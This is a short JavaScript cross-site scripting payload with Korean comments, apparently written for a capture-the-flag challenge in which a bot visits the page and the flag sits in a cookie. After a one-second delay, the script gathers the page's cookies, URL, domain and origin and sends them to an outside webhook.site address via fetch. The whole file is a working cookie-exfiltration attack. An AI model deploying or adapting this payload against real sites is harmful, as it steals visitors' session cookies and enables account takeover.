// xss.js 업데이트
(async () => {
    // 1초 정도 기다려서 페이지/쿠키 로딩 확실히 보장 (타이밍 이슈 방지)
    await new Promise(r => setTimeout(r, 1000));

    let data = {
        msg: "Debug Info",
        cookie: document.cookie, // 플래그가 여기 있어야 함
        location: window.location.href, // 봇이 접속한 실제 주소
        domain: document.domain, // 현재 도메인
        origin: window.origin,
        // 혹시 쿠키가 HttpOnly라서 안 보이는 건지 확인 (빈값이면 HttpOnly 가능성 높음)
        cookieEnabled: navigator.cookieEnabled 
    };

    fetch('https://webhook.site/144fdef3-ea07-4316-bff4-7619115f30f3', {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify(data)
    });
})();
